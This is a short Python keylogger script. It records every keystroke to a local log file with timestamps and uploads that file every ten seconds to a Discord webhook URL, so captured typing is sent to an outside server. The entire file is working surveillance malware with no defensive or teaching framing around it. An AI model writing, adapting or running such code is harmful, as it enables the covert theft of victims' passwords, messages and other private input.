import keyboard
import datetime
import requests
import time
import os

word = ""
interval = 10
logfile = "keylog.txt"
webhook_url = "https://discord.com/api/webhooks/giriniz..."

def on_press(key):
    global word
    if key.name in ["space", "enter"]:
        with open(logfile, "a") as file:
            file.write(word + " " + key.name + " " + str(datetime.datetime.now()) + "\n")
        word = ""
    else:
        word += key.name

def send_discord_message(file_path):
    with open(file_path, "rb") as f:
        file_data = f.read()

    payload = {
        "content": "Log"
    }

    response = requests.post(webhook_url, files={"file": file_data}, data=payload)




keyboard.on_press(on_press)

while True:
    time.sleep(interval)
    with open(logfile) as file:
        data = file.read().strip()

    if data:
        send_discord_message(logfile)